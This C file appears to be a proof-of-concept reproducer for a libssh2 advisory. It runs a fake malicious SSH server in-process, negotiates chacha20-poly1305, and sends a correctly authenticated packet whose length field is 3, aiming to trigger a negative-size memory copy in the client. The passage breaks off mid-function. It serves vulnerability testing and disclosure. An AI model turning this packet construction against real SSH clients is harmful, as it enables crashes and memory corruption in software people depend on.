/*
 * residual.c -- exercise libssh2's transport read path against a malicious
 * SSH server that negotiates chacha20-poly1305@openssh.com and then sends an
 * authenticated packet whose 4-byte packet length field is 3 (see
 * GHSA-x4g5-mgfc-cxvv). Everything runs in-process: the "network" is a pair
 * of callbacks installed with libssh2_session_callback_set(), so the only
 * entry points used are the public libssh2 API.
 *
 * On a vulnerable build the size field strip in
 * crypt_encrypt_chacha20_poly_buffer() computes buf_len - 4 with buf_len == 3
 * and AddressSanitizer aborts with negative-size-param inside libssh2.
 * On a fixed build the packet is rejected and the handshake simply fails.
 */

#include <errno.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#include <openssl/bn.h>
#include <openssl/core_names.h>
#include <openssl/evp.h>
#include <openssl/rsa.h>

#include <libssh2.h>

/* SSH protocol message numbers (RFC 4253) */
#define SSH_MSG_KEXINIT 20
#define SSH_MSG_NEWKEYS 21
#define SSH_MSG_KEXDH_INIT 30
#define SSH_MSG_KEXDH_REPLY 31

/* ------------------------------------------------------------------ */
/* tiny growable byte queue                                            */

struct buf {
    unsigned char *p;
    size_t len, cap;
};

static void buf_reserve(struct buf *b, size_t need)
{
    unsigned char *n;
    if(b->len + need <= b->cap)
        return;
    b->cap = (b->cap ? b->cap * 2 : 4096);
    while(b->cap < b->len + need)
        b->cap *= 2;
    n = realloc(b->p, b->cap);
    if(!n) {
        fprintf(stderr, "out of memory\n");
        exit(2);
    }
    b->p = n;
}

static void buf_put(struct buf *b, const void *data, size_t len)
{
    buf_reserve(b, len);
    if(len)
        memcpy(b->p + b->len, data, len);
    b->len += len;
}

static void buf_drop(struct buf *b, size_t n)
{
    if(n > b->len)
        n = b->len;
    if(n)
        memmove(b->p, b->p + n, b->len - n);
    b->len -= n;
}

/* ------------------------------------------------------------------ */
/* SSH wire helpers                                                    */

static void put_u32be(struct buf *b, uint32_t v)
{
    unsigned char t[4] = {
        (unsigned char)(v >> 24), (unsigned char)(v >> 16),
        (unsigned char)(v >> 8),  (unsigned char)v
    };
    buf_put(b, t, 4);
}

static void put_string(struct buf *b, const void *data, size_t len)
{
    put_u32be(b, (uint32_t)len);
    buf_put(b, len ? data : "", len);
}

static void put_cstring(struct buf *b, const char *s)
{
    put_string(b, s, strlen(s));
}

static uint32_t get_u32be(const unsigned char *p)
{
    return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) |
           ((uint32_t)p[2] << 8) | (uint32_t)p[3];
}

/* ------------------------------------------------------------------ */
/* ChaCha20 (the OpenSSH "chacha-merged" variant: 64-bit block counter
 * in words 12/13, 64-bit IV in words 14/15, both read little-endian)   */

struct chacha20_ctx {
    uint32_t st[16];
};

#define ROTL(v, c) (((v) << (c)) | ((v) >> (32 - (c))))
#define QR(a, b, c, d)                          \
    a += b; d ^= a; d = ROTL(d, 16);            \
    c += d; b ^= c; b = ROTL(b, 12);            \
    a += b; d ^= a; d = ROTL(d, 8);             \
    c += d; b ^= c; b = ROTL(b, 7);

static void chacha20_block(const struct chacha20_ctx *ctx, unsigned char out[64])
{
    uint32_t x[16], t;
    int i;

    memcpy(x, ctx->st, sizeof(x));
    for(i = 0; i < 10; i++) {
        QR(x[0], x[4], x[8], x[12]);
        QR(x[1], x[5], x[9], x[13]);
        QR(x[2], x[6], x[10], x[14]);
        QR(x[3], x[7], x[11], x[15]);
        QR(x[0], x[5], x[10], x[15]);
        QR(x[1], x[6], x[11], x[12]);
        QR(x[2], x[7], x[8], x[13]);
        QR(x[3], x[4], x[9], x[14]);
    }
    for(i = 0; i < 16; i++) {
        t = x[i] + ctx->st[i];
        out[i * 4 + 0] = (unsigned char)t;
        out[i * 4 + 1] = (unsigned char)(t >> 8);
        out[i * 4 + 2] = (unsigned char)(t >> 16);
        out[i * 4 + 3] = (unsigned char)(t >> 24);
    }
}

/* iv is 8 raw bytes exactly as libssh2 passes them (a big-endian render of
 * the packet sequence number); counter is a 64-bit little-endian value */
static void chacha20_xor(const unsigned char key[32], const unsigned char iv[8],
                         uint64_t counter, const unsigned char *in,
                         unsigned char *out, size_t len)
{
    struct chacha20_ctx c;
    unsigned char blk[64];
    size_t n;
    int i;
    static const unsigned char sigma[16] = "expand 32-byte k";

    for(i = 0; i < 4; i++)
        c.st[i] = (uint32_t)sigma[i * 4] | ((uint32_t)sigma[i * 4 + 1] << 8) |
                  ((uint32_t)sigma[i * 4 + 2] << 16) |
                  ((uint32_t)sigma[i * 4 + 3] << 24);
    for(i = 0; i < 8; i++)
        c.st[4 + i] = (uint32_t)key[i * 4] | ((uint32_t)key[i * 4 + 1] << 8) |
                      ((uint32_t)key[i * 4 + 2] << 16) |
                      ((uint32_t)key[i * 4 + 3] << 24);
    c.st[12] = (uint32_t)counter;
    c.st[13] = (uint32_t)(counter >> 32);
    c.st[14] = (uint32_t)iv[0] | ((uint32_t)iv[1] << 8) |
               ((uint32_t)iv[2] << 16) | ((uint32_t)iv[3] << 24);
    c.st[15] = (uint32_t)iv[4] | ((uint32_t)iv[5] << 8) |
               ((uint32_t)iv[6] << 16) | ((uint32_t)iv[7] << 24);

    while(len) {
        chacha20_block(&c, blk);
        n = len < 64 ? len : 64;
        for(i = 0; i < (int)n; i++)
            out[i] = in[i] ^ blk[i];
        out += n;
        in += n;
        len -= n;
        c.st[12]++;
        if(!c.st[12])
            c.st[13]++;
    }
}

/* ------------------------------------------------------------------ */
/* Poly1305 (poly1305-donna, 32-bit limbs)                             */

struct poly1305_state {
    uint32_t r[5], h[5], pad[4];
};

#define P32TO32(p) \
    ((uint32_t)(p)[0] | ((uint32_t)(p)[1] << 8) | \
     ((uint32_t)(p)[2] << 16) | ((uint32_t)(p)[3] << 24))

static void poly1305_init(struct poly1305_state *st,
                          const unsigned char key[32])
{
    st->r[0] = (P32TO32(key + 0)) & 0x3ffffff;
    st->r[1] = (P32TO32(key + 3) >> 2) & 0x3ffff03;
    st->r[2] = (P32TO32(key + 6) >> 4) & 0x3ffc0ff;
    st->r[3] = (P32TO32(key + 9) >> 6) & 0x3f03fff;
    st->r[4] = (P32TO32(key + 12) >> 8) & 0x00fffff;
    st->h[0] = st->h[1] = st->h[2] = st->h[3] = st->h[4] = 0;
    st->pad[0] = P32TO32(key + 16);
    st->pad[1] = P32TO32(key + 20);
    st->pad[2] = P32TO32(key + 24);
    st->pad[3] = P32TO32(key + 28);
}

static void poly1305_blocks(struct poly1305_state *st,
                            const unsigned char *m, size_t bytes, int final)
{
    uint32_t r0, r1, r2, r3, r4, s1, s2, s3, s4;
    uint32_t h0, h1, h2, h3, h4, c;
    uint64_t d0, d1, d2, d3, d4;

    r0 = st->r[0]; r1 = st->r[1]; r2 = st->r[2]; r3 = st->r[3]; r4 = st->r[4];
    s1 = r1 * 5; s2 = r2 * 5; s3 = r3 * 5; s4 = r4 * 5;
    h0 = st->h[0]; h1 = st->h[1]; h2 = st->h[2]; h3 = st->h[3]; h4 = st->h[4];

    while(bytes >= 16) {
        h0 += (P32TO32(m + 0)) & 0x3ffffff;
        h1 += (P32TO32(m + 3) >> 2) & 0x3ffffff;
        h2 += (P32TO32(m + 6) >> 4) & 0x3ffffff;
        h3 += (P32TO32(m + 9) >> 6) & 0x3ffffff;
        h4 += (P32TO32(m + 12) >> 8) | (final ? 0 : (1u << 24));

        d0 = (uint64_t)h0 * r0 + (uint64_t)h1 * s4 + (uint64_t)h2 * s3 +
             (uint64_t)h3 * s2 + (uint64_t)h4 * s1;
        d1 = (uint64_t)h0 * r1 + (uint64_t)h1 * r0 + (uint64_t)h2 * s4 +
             (uint64_t)h3 * s3 + (uint64_t)h4 * s2;
        d2 = (uint64_t)h0 * r2 + (uint64_t)h1 * r1 + (uint64_t)h2 * r0 +
             (uint64_t)h3 * s4 + (uint64_t)h4 * s3;
        d3 = (uint64_t)h0 * r3 + (uint64_t)h1 * r2 + (uint64_t)h2 * r1 +
             (uint64_t)h3 * r0 + (uint64_t)h4 * s4;
        d4 = (uint64_t)h0 * r4 + (uint64_t)h1 * r3 + (uint64_t)h2 * r2 +
             (uint64_t)h3 * r1 + (uint64_t)h4 * r0;

        c = (uint32_t)(d0 >> 26); h0 = (uint32_t)d0 & 0x3ffffff;
        d1 += c; c = (uint32_t)(d1 >> 26); h1 = (uint32_t)d1 & 0x3ffffff;
        d2 += c; c = (uint32_t)(d2 >> 26); h2 = (uint32_t)d2 & 0x3ffffff;
        d3 += c; c = (uint32_t)(d3 >> 26); h3 = (uint32_t)d3 & 0x3ffffff;
        d4 += c; c = (uint32_t)(d4 >> 26); h4 = (uint32_t)d4 & 0x3ffffff;
        h0 += c * 5; c = h0 >> 26; h0 &= 0x3ffffff;
        h1 += c;

        m += 16;
        bytes -= 16;
    }

    if(bytes) {
        unsigned char t[16];
        memcpy(t, m, bytes);
        memset(t + bytes, 0, 16 - bytes);
        t[bytes] = 1; /* append a 1 byte, then zero pad */
        h0 += (P32TO32(t + 0)) & 0x3ffffff;
        h1 += (P32TO32(t + 3) >> 2) & 0x3ffffff;
        h2 += (P32TO32(t + 6) >> 4) & 0x3ffffff;
        h3 += (P32TO32(t + 9) >> 6) & 0x3ffffff;
        h4 += (P32TO32(t + 12) >> 8);

        d0 = (uint64_t)h0 * r0 + (uint64_t)h1 * s4 + (uint64_t)h2 * s3 +
             (uint64_t)h3 * s2 + (uint64_t)h4 * s1;
        d1 = (uint64_t)h0 * r1 + (uint64_t)h1 * r0 + (uint64_t)h2 * s4 +
             (uint64_t)h3 * s3 + (uint64_t)h4 * s2;
        d2 = (uint64_t)h0 * r2 + (uint64_t)h1 * r1 + (uint64_t)h2 * r0 +
             (uint64_t)h3 * s4 + (uint64_t)h4 * s3;
        d3 = (uint64_t)h0 * r3 + (uint64_t)h1 * r2 + (uint64_t)h2 * r1 +
             (uint64_t)h3 * r0 + (uint64_t)h4 * s4;
        d4 = (uint64_t)h0 * r4 + (uint64_t)h1 * r3 + (uint64_t)h2 * r2 +
             (uint64_t)h3 * r1 + (uint64_t)h4 * r0;

        c = (uint32_t)(d0 >> 26); h0 = (uint32_t)d0 & 0x3ffffff;
        d1 += c; c = (uint32_t)(d1 >> 26); h1 = (uint32_t)d1 & 0x3ffffff;
        d2 += c; c = (uint32_t)(d2 >> 26); h2 = (uint32_t)d2 & 0x3ffffff;
        d3 += c; c = (uint32_t)(d3 >> 26); h3 = (uint32_t)d3 & 0x3ffffff;
        d4 += c; c = (uint32_t)(d4 >> 26); h4 = (uint32_t)d4 & 0x3ffffff;
        h0 += c * 5; c = h0 >> 26; h0 &= 0x3ffffff;
        h1 += c;
    }

    st->h[0] = h0; st->h[1] = h1; st->h[2] = h2; st->h[3] = h3; st->h[4] = h4;
}

static void poly1305_finish(struct poly1305_state *st, unsigned char mac[16])
{
    uint32_t h0, h1, h2, h3, h4, c, g0, g1, g2, g3, g4, mask;
    uint64_t f;

    h0 = st->h[0]; h1 = st->h[1]; h2 = st->h[2]; h3 = st->h[3]; h4 = st->h[4];

    c = h1 >> 26; h1 &= 0x3ffffff;
    h2 += c; c = h2 >> 26; h2 &= 0x3ffffff;
    h3 += c; c = h3 >> 26; h3 &= 0x3ffffff;
    h4 += c; c = h4 >> 26; h4 &= 0x3ffffff;
    h0 += c * 5; c = h0 >> 26; h0 &= 0x3ffffff;
    h1 += c;

    g0 = h0 + 5; c = g0 >> 26; g0 &= 0x3ffffff;
    g1 = h1 + c; c = g1 >> 26; g1 &= 0x3ffffff;
    g2 = h2 + c; c = g2 >> 26; g2 &= 0x3ffffff;
    g3 = h3 + c; c = g3 >> 26; g3 &= 0x3ffffff;
    g4 = h4 + c - (1u << 26);

    mask = (g4 >> 31) - 1;
    g0 &= mask; g1 &= mask; g2 &= mask; g3 &= mask; g4 &= mask;
    mask = ~mask;
    h0 = (h0 & mask) | g0;
    h1 = (h1 & mask) | g1;
    h2 = (h2 & mask) | g2;
    h3 = (h3 & mask) | g3;
    h4 = (h4 & mask) | g4;

    h0 = ((h0) | (h1 << 26)) & 0xffffffff;
    h1 = ((h1 >> 6) | (h2 << 20)) & 0xffffffff;
    h2 = ((h2 >> 12) | (h3 << 14)) & 0xffffffff;
    h3 = ((h3 >> 18) | (h4 << 8)) & 0xffffffff;

    f = (uint64_t)h0 + st->pad[0]; h0 = (uint32_t)f;
    f = (uint64_t)h1 + st->pad[1] + (f >> 32); h1 = (uint32_t)f;
    f = (uint64_t)h2 + st->pad[2] + (f >> 32); h2 = (uint32_t)f;
    f = (uint64_t)h3 + st->pad[3] + (f >> 32); h3 = (uint32_t)f;

    mac[0] = (unsigned char)h0; mac[1] = (unsigned char)(h0 >> 8);
    mac[2] = (unsigned char)(h0 >> 16); mac[3] = (unsigned char)(h0 >> 24);
    mac[4] = (unsigned char)h1; mac[5] = (unsigned char)(h1 >> 8);
    mac[6] = (unsigned char)(h1 >> 16); mac[7] = (unsigned char)(h1 >> 24);
    mac[8] = (unsigned char)h2; mac[9] = (unsigned char)(h2 >> 8);
    mac[10] = (unsigned char)(h2 >> 16); mac[11] = (unsigned char)(h2 >> 24);
    mac[12] = (unsigned char)h3; mac[13] = (unsigned char)(h3 >> 8);
    mac[14] = (unsigned char)(h3 >> 16); mac[15] = (unsigned char)(h3 >> 24);
}

static void poly1305_auth(unsigned char mac[16], const unsigned char *m,
                          size_t len, const unsigned char key[32])
{
    struct poly1305_state st;
    poly1305_init(&st, key);
    poly1305_blocks(&st, m, len, 0);
    poly1305_finish(&st, mac);
}

/* ------------------------------------------------------------------ */
/* the fake server                                                     */

/* RFC 3526 group 14 prime (2048-bit), generator 2 */
static const unsigned char dh_p[] = {
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xC9, 0x0F, 0xDA, 0xA2,
    0x21, 0x68, 0xC2, 0x34, 0xC4, 0xC6, 0x62, 0x8B, 0x80, 0xDC, 0x1C, 0xD1,
    0x29, 0x02, 0x4E, 0x08, 0x8A, 0x67, 0xCC, 0x74, 0x02, 0x0B, 0xBE, 0xA6,
    0x3B, 0x13, 0x9B, 0x22, 0x51, 0x4A, 0x08, 0x79, 0x8E, 0x34, 0x04, 0xDD,
    0xEF, 0x95, 0x19, 0xB3, 0xCD, 0x3A, 0x43, 0x1B, 0x30, 0x2B, 0x0A, 0x6D,
    0xF2, 0x5F, 0x14, 0x37, 0x4F, 0xE1, 0x35, 0x6D, 0x6D, 0x51, 0xC2, 0x45,
    0xE4, 0x85, 0xB5, 0x76, 0x62, 0x5E, 0x7E, 0xC6, 0xF4, 0x4C, 0x42, 0xE9,
    0xA6, 0x37, 0xED, 0x6B, 0x0B, 0xFF, 0x5C, 0xB6, 0xF4, 0x06, 0xB7, 0xED,
    0xEE, 0x38, 0x6B, 0xFB, 0x5A, 0x89, 0x9F, 0xA5, 0xAE, 0x9F, 0x24, 0x11,
    0x7C, 0x4B, 0x1F, 0xE6, 0x49, 0x28, 0x66, 0x51, 0xEC, 0xE4, 0x5B, 0x3D,
    0xC2, 0x00, 0x7C, 0xB8, 0xA1, 0x63, 0xBF, 0x05, 0x98, 0xDA, 0x48, 0x36,
    0x1C, 0x55, 0xD3, 0x9A, 0x69, 0x16, 0x3F, 0xA8, 0xFD, 0x24, 0xCF, 0x5F,
    0x83, 0x65, 0x5D, 0x23, 0xDC, 0xA3, 0xAD, 0x96, 0x1C, 0x62, 0xF3, 0x56,
    0x20, 0x85, 0x52, 0xBB, 0x9E, 0xD5, 0x29, 0x07, 0x70, 0x96, 0x96, 0x6D,
    0x67, 0x0C, 0x35, 0x4E, 0x4A, 0xBC, 0x98, 0x04, 0xF1, 0x74, 0x6C, 0x08,
    0xCA, 0x18, 0x21, 0x7C, 0x32, 0x90, 0x5E, 0x46, 0x2E, 0x36, 0xCE, 0x3B,
    0xE3, 0x9E, 0x77, 0x2C, 0x18, 0x0E, 0x86, 0x03, 0x9B, 0x27, 0x83, 0xA2,
    0xEC, 0x07, 0xA2, 0x8F, 0xB5, 0xC5, 0x5D, 0xF0, 0x6F, 0x4C, 0x52, 0xC9,
    0xDE, 0x2B, 0xCB, 0xF6, 0x95, 0x58, 0x17, 0x18, 0x39, 0x95, 0x49, 0x7C,
    0xEA, 0x95, 0x6A, 0xE5, 0x15, 0xD2, 0x26, 0x18, 0x98, 0xFA, 0x05, 0x10,
    0x15, 0x72, 0x8E, 0x5A, 0x8A, 0xAC, 0xAA, 0x68, 0xFF, 0xFF, 0xFF, 0xFF,
    0xFF, 0xFF, 0xFF, 0xFF,
};

/* fixed server-side DH private exponent (any value in [2, p-2] works) */
static const unsigned char dh_x[] = {
    0x21, 0x8D, 0x9F, 0x3B, 0x7C, 0x5A, 0xE6, 0x41,
    0x0F, 0x93, 0x58, 0x2D, 0x6B, 0xA7, 0x1E, 0xC4,
    0x84, 0x2F, 0x19, 0x5D, 0x6E, 0x0B, 0x33, 0x71,
    0xF5, 0x2A, 0x09, 0x8E, 0x47, 0xC1, 0xB6, 0x28
};

static const char SRV_KEX[] = "diffie-hellman-group14-sha256";
static const char SRV_HOSTKEYS[] = "rsa-sha2-512,rsa-sha2-256,ssh-rsa";
static const char SRV_CRYPT[] = "chacha20-poly1305@openssh.com";
static const char SRV_MAC[] = "hmac-sha2-256";
static const char SRV_COMP[] = "none";
static const char SRV_BANNER[] = "SSH-2.0-OpenSSH_9.6";

static const unsigned char SRV_COOKIE[16] = {
    0xB4, 0x1D, 0x7E, 0x3A, 0x19, 0xC2, 0x58, 0x6F,
    0x0D, 0x93, 0x4A, 0xE7, 0x22, 0x51, 0xAF, 0x8C
};

enum srv_state {
    ST_BANNER,      /* waiting for the client banner line */
    ST_KEXINIT,     /* waiting for the client KEXINIT */
    ST_KEXDH,       /* waiting for SSH_MSG_KEXDH_INIT */
    ST_DONE         /* nothing left to send */
};

#define MAX_LISTS 10
#define MAX_PACKET (40000)

struct fake_server {
    struct buf in;                  /* bytes received from the client */
    struct buf out;                 /* bytes still to hand to the client */
    enum srv_state state;
    char client_banner[256];
    unsigned char client_kexinit[8192];  /* payload incl. message type */
    size_t client_kexinit_len;
    char *lists[MAX_LISTS];         /* name-lists from the client KEXINIT */
    EVP_PKEY *rsa;                  /* server host key */
    struct buf k_s;                 /* host key public blob */
    unsigned char session_id[32];
    unsigned char h[32];            /* exchange hash */
    const unsigned char *session_k; /* mpint encoding of the shared secret */
    size_t session_k_len;
    unsigned char s2c_secret[64];   /* server-to-client chacha20-poly1305 */
};

static struct fake_server g_srv;
static unsigned char g_scratch[MAX_PACKET + 4];

static void srv_queue_plain(const unsigned char *payload, size_t len)
{
    struct buf pkt = {0};
    size_t pad, i;

    /* (4 + 1 + payload + padding) % 8 == 0, padding >= 4 */
    pad = 8 - ((5 + len) % 8);
    if(pad < 4)
        pad += 8;

    put_u32be(&pkt, (uint32_t)(1 + len + pad));
    buf_reserve(&pkt, 1);
    pkt.p[pkt.len++] = (unsigned char)pad;
    buf_put(&pkt, payload, len);
    for(i = 0; i < pad; i++)
        buf_put(&pkt, "", 1);

    buf_put(&g_srv.out, pkt.p, pkt.len);
    free(pkt.p);
}

/* find the first algorithm of the client's name-list that the server offers */
static char *agree(const char *client_list, const char *server_list)
{
    const char *s = client_list;

    while(s && *s) {
        const char *comma = strchr(s, ',');
        size_t n = comma ? (size_t)(comma - s) : strlen(s);
        const char *t = server_list;

        while(t && *t) {
            const char *tc = strchr(t, ',');
            size_t tn = tc ? (size_t)(tc - t) : strlen(t);
            if(n == tn && !strncmp(s, t, n)) {
                char *r = malloc(n + 1);
                if(!r)
                    exit(2);
                memcpy(r, s, n);
                r[n] = '\0';
                return r;
            }
            t = tc ? tc + 1 : NULL;
        }
        s = comma ? comma + 1 : NULL;
    }
    return NULL;
}

static void mpint_buf(struct buf *b, const BIGNUM *bn)
{
    size_t n = BN_num_bytes(bn);
    unsigned char *t = malloc(n ? n : 1);
    int prepend_zero;

    if(!t)
        exit(2);
    BN_bn2bin(bn, t);
    /* strip leading zero bytes the way SSH mpints do */
    while(n > 0 && t[0] == 0) {
        n--;
        memmove(t, t + 1, n);
    }
    prepend_zero = (n > 0 && (t[0] & 0x80));
    put_u32be(b, (uint32_t)(n + prepend_zero));
    if(prepend_zero)
        buf_put(b, "", 1);
    buf_put(b, t, n);
    free(t);
}

static void hash_string(EVP_MD_CTX *md, const unsigned char *d, size_t n)
{
    unsigned char l[4] = {
        (unsigned char)(n >> 24), (unsigned char)(n >> 16),
        (unsigned char)(n >> 8),  (unsigned char)n
    };
    EVP_DigestUpdate(md, l, 4);
    EVP_DigestUpdate(md, n ? d : (const unsigned char *)"", n);
}

static void build_hostkey_blob(void)
{
    BIGNUM *e = NULL, *n = NULL;

    EVP_PKEY_get_bn_param(g_srv.rsa, OSSL_PKEY_PARAM_RSA_E, &e);
    EVP_PKEY_get_bn_param(g_srv.rsa, OSSL_PKEY_PARAM_RSA_N, &n);
    put_cstring(&g_srv.k_s, "ssh-rsa");
    mpint_buf(&g_srv.k_s, e);
    mpint_buf(&g_srv.k_s, n);
    BN_free(e);
    BN_free(n);
}

/* RFC 4253 key extension: K1 = HASH(K || H || letter || session_id),
   Kn = HASH(K || H || K1 || ... || Kn-1) */
static void derive_secret(unsigned char *out, size_t need, char letter)
{
    EVP_MD_CTX *md = EVP_MD_CTX_new();
    unsigned char block[32];
    size_t done = 0;

    if(!md)
        exit(2);
    while(done < need) {
        EVP_DigestInit_ex(md, EVP_sha256(), NULL);
        /* session_k is the string-encoded mpint, length prefix included */
        EVP_DigestUpdate(md, g_srv.session_k, g_srv.session_k_len);
        EVP_DigestUpdate(md, g_srv.h, 32);
        if(done)
            EVP_DigestUpdate(md, out, done);
        else {
            EVP_DigestUpdate(md, &letter, 1);
            EVP_DigestUpdate(md, g_srv.session_id, 32);
        }
        EVP_DigestFinal_ex(md, block, NULL);
        memcpy(out + done, block, need - done < 32 ? need - done : 32);
        done += 32;
    }
    EVP_MD_CTX_free(md);
}

/* try to consume one complete unencrypted packet; returns 1 on success */
static int read_client_packet(const unsigned char **payload, size_t *len)
{
    uint32_t plen;
    unsigned char pad;

    if(g_srv.in.len < 4)
        return 0;
    plen = get_u32be(g_srv.in.p);
    if(plen < 2 || plen > MAX_PACKET) {
        buf_drop(&g_srv.in, g_srv.in.len);
        return 0;
    }
    if(g_srv.in.len < 4 + (size_t)plen)
        return 0;
    memcpy(g_scratch, g_srv.in.p, 4 + (size_t)plen);
    buf_drop(&g_srv.in, 4 + (size_t)plen);
    pad = g_scratch[4];
    if((uint32_t)pad + 1 > plen)
        return 0;
    *payload = g_scratch + 5;
    *len = plen - 1 - pad;
    return 1;
}

static void parse_kexinit_lists(const unsigned char *p, size_t len)
{
    size_t i, off = 1 + 16;  /* type byte + cookie */

    for(i = 0; i < MAX_LISTS; i++)
        g_srv.lists[i] = NULL;
    for(i = 0; i < MAX_LISTS && off + 4 <= len; i++) {
        uint32_t n = get_u32be(p + off);
        off += 4;
        if(off + n > len)
            return;
        g_srv.lists[i] = malloc(n + 1);
        if(!g_srv.lists[i])
            exit(2);
        memcpy(g_srv.lists[i], p + off, n);
        g_srv.lists[i][n] = '\0';
        off += n;
    }
}

static void build_server_kexinit(struct buf *b)
{
    buf_reserve(b, 1);
    b->p[b->len++] = SSH_MSG_KEXINIT;
    buf_put(b, SRV_COOKIE, 16);
    put_cstring(b, SRV_KEX);
    put_cstring(b, SRV_HOSTKEYS);
    put_cstring(b, SRV_CRYPT);    /* c2s */
    put_cstring(b, SRV_CRYPT);    /* s2c */
    put_cstring(b, SRV_MAC);
    put_cstring(b, SRV_MAC);
    put_cstring(b, SRV_COMP);
    put_cstring(b, SRV_COMP);
    put_string(b, NULL, 0);       /* languages c2s */
    put_string(b, NULL, 0);       /* languages s2c */
    buf_put(b, "", 1);            /* first_kex_packet_follows */
    put_u32be(b, 0);              /* reserved */
}

static void send_server_kexinit(void)
{
    struct buf b = {0};

    build_server_kexinit(&b);
    srv_queue_plain(b.p, b.len);
    free(b.p);
}

/* finish the key exchange and emit NEWKEYS plus the malformed packet */
static void finish_kex(const unsigned char *kexdh_init, size_t len)
{
    const unsigned char *e_str;      /* mpint encoding as received */
    size_t e_str_len;
    BIGNUM *p = NULL, *g = NULL, *x = NULL, *e = NULL, *f = NULL, *k = NULL;
    BN_CTX *bctx = BN_CTX_new();
    struct buf reply = {0}, fbuf = {0}, kbuf = {0};
    EVP_MD_CTX *md = NULL;
    unsigned char h[32];
    unsigned int hlen = sizeof(h);
    unsigned char *sig = NULL;
    size_t siglen = 0;
    char *hostkey_alg = NULL;
    const char *sig_alg_name;
    const EVP_MD *sig_md;
    unsigned char newkeys = SSH_MSG_NEWKEYS;
    struct buf server_kexinit = {0};

    if(len < 5 || kexdh_init[0] != SSH_MSG_KEXDH_INIT)
        goto fail;
    e_str = kexdh_init + 1;
    e_str_len = get_u32be(e_str);
    if(e_str_len + 5 > len)
        goto fail;
    e_str += 4;

    p = BN_bin2bn(dh_p, sizeof(dh_p), NULL);
    g = BN_new();
    x = BN_bin2bn(dh_x, sizeof(dh_x), NULL);
    e = BN_bin2bn(e_str, e_str_len, NULL);
    f = BN_new();
    k = BN_new();
    if(!p || !g || !x || !e || !f || !k || !BN_set_word(g, 2))
        goto fail;

    /* f = g^x mod p, K = e^x mod p */
    if(!bctx || !BN_mod_exp(f, g, x, p, bctx) ||
       !BN_mod_exp(k, e, x, p, bctx))
        goto fail;

    mpint_buf(&fbuf, f);
    mpint_buf(&kbuf, k);

    /* exchange hash */
    md = EVP_MD_CTX_new();
    if(!md)
        goto fail;
    EVP_DigestInit_ex(md, EVP_sha256(), NULL);
    hash_string(md, (const unsigned char *)g_srv.client_banner,
                strlen(g_srv.client_banner));
    hash_string(md, (const unsigned char *)SRV_BANNER, strlen(SRV_BANNER));
    hash_string(md, g_srv.client_kexinit, g_srv.client_kexinit_len);
    build_server_kexinit(&server_kexinit);
    hash_string(md, server_kexinit.p, server_kexinit.len);
    hash_string(md, g_srv.k_s.p, g_srv.k_s.len);
    EVP_DigestUpdate(md, e_str - 4, e_str_len + 4);
    hash_string(md, fbuf.p + 4, fbuf.len - 4);
    hash_string(md, kbuf.p + 4, kbuf.len - 4);
    if(EVP_DigestFinal_ex(md, h, &hlen) != 1)
        goto fail;

    memcpy(g_srv.session_id, h, 32);
    memcpy(g_srv.h, h, 32);
    g_srv.session_k = kbuf.p;
    g_srv.session_k_len = kbuf.len;

    /* sign H with the host key, using whichever RSA flavor was agreed */
    hostkey_alg = agree(g_srv.lists[1] ? g_srv.lists[1] : "", SRV_HOSTKEYS);
    sig_alg_name = hostkey_alg ? hostkey_alg : "rsa-sha2-256";
    if(!strcmp(sig_alg_name, "rsa-sha2-512")) {
        sig_alg_name = "rsa-sha2-512";
        sig_md = EVP_sha512();
    }
    else if(!strcmp(sig_alg_name, "rsa-sha2-256")) {
        sig_alg_name = "rsa-sha2-256";
        sig_md = EVP_sha256();
    }
    else {
        sig_alg_name = "ssh-rsa";
        sig_md = EVP_sha1();
    }
    {
        EVP_MD_CTX *smd = EVP_MD_CTX_new();
        EVP_PKEY_CTX *pctx = NULL;
        if(!smd)
            goto fail;
        if(EVP_DigestSignInit(smd, &pctx, sig_md, NULL, g_srv.rsa) != 1 ||
           EVP_PKEY_CTX_set_rsa_padding(pctx, RSA_PKCS1_PADDING) <= 0 ||
           EVP_DigestSign(smd, NULL, &siglen, h, hlen) != 1)
            goto fail;
        sig = malloc(siglen);
        if(!sig || EVP_DigestSign(smd, sig, &siglen, h, hlen) != 1)
            goto fail;
        EVP_MD_CTX_free(smd);
    }

    /* SSH_MSG_KEXDH_REPLY */
    buf_reserve(&reply, 1);
    reply.p[reply.len++] = SSH_MSG_KEXDH_REPLY;
    put_string(&reply, g_srv.k_s.p, g_srv.k_s.len);
    buf_put(&reply, fbuf.p, fbuf.len);
    {
        struct buf sb = {0};
        put_cstring(&sb, sig_alg_name);
        put_string(&sb, sig, siglen);
        put_string(&reply, sb.p, sb.len);
        free(sb.p);
    }
    srv_queue_plain(reply.p, reply.len);

    srv_queue_plain(&newkeys, 1);

    derive_secret(g_srv.s2c_secret, sizeof(g_srv.s2c_secret), 'D');

    /* ---- the malformed packet: length field of 3, seqno 3 ------------- */
    {
        unsigned char plain[3] = { 0x02, 0x06, 0x00 };
        unsigned char seq[8], enc_len[4], ct[3], poly_key[32], tag[16];
        const unsigned char *main = g_srv.s2c_secret;
        const unsigned char *header = g_srv.s2c_secret + 32;
        uint32_t l = 3;
        struct buf pkt = {0};

        /* big-endian render of the sequence number, the exact 8 bytes
           libssh2 feeds to the cipher as its IV */
        seq[0] = 0; seq[1] = 0; seq[2] = 0; seq[3] = 0;
        seq[4] = 0; seq[5] = 0; seq[6] = 0; seq[7] = 3;

        enc_len[0] = (unsigned char)(l >> 24);
        enc_len[1] = (unsigned char)(l >> 16);
        enc_len[2] = (unsigned char)(l >> 8);
        enc_len[3] = (unsigned char)l;
        chacha20_xor(header, seq, 0, enc_len, enc_len, 4);
        chacha20_xor(main, seq, 1, plain, ct, 3);
        memset(poly_key, 0, sizeof(poly_key));
        chacha20_xor(main, seq, 0, poly_key, poly_key, 32);
        {
            unsigned char aad[7];
            memcpy(aad, enc_len, 4);
            memcpy(aad + 4, ct, 3);
            poly1305_auth(tag, aad, 7, poly_key);
        }
        buf_put(&pkt, enc_len, 4);
        buf_put(&pkt, ct, 3);
        buf_put(&pkt, tag, 16);
        buf_put(&g_srv.out, pkt.p, pkt.len);
        free(pkt.p);
    }

    {
        char *kex_alg = agree(g_srv.lists[0] ? g_srv.lists[0] : "", SRV_KEX);
        printf("[poc] negotiated kex: %s\n", kex_alg ? kex_alg : "(none)");
        printf("[poc] negotiated hostkey: %s\n", sig_alg_name);
